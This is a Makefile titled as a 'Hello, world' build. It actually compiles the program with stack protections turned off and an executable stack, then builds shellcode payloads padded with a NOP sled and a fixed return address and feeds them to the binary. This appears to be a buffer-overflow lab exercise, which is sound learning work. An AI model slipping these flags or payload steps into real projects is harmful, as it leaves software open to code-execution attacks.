# Makefile exaple for building "Hello, world" C program

CC = gcc

ASM = nasm
ASMFLAGS = 

CFLAGS = \
-Wall \
-Wextra \
-D_FORTIFY_SOURCE=0 \
-O1 \
-g \
-fno-omit-frame-pointer \
-fno-stack-protector \
-z execstack \
-z norelro

SRC = hello.c
BIN = hello

.PHONY:all clean

all:$(BIN) payload.shellcode payload.pwnd

$(BIN):$(SRC)
	$(CC) $(CFLAGS) -o $@ $^


payload.shellcode: shellcode.asm
	nasm shellcode.asm -o $@; \
	perl -e 'printf "\x90"x(88-45)' >> $@; \
	perl -e 'print "\x30\xf5\xff\xbf"' >> $@

payload.pwnd: pwnd.final.asm
	nasm $^ -o $@; \
	perl -e 'printf "\x90"x(88-49)' >> $@; \
	perl -e 'print "\x30\xf5\xff\xbf"' >> $@

runsh:
	./$(BIN) "$$(cat payload.shellcode)"

runpwnd:
	./$(BIN) "$$(cat payload.pwnd)"

clean:
	rm $(BIN)
	rm payload.shellcode
	rm payload.pwnd

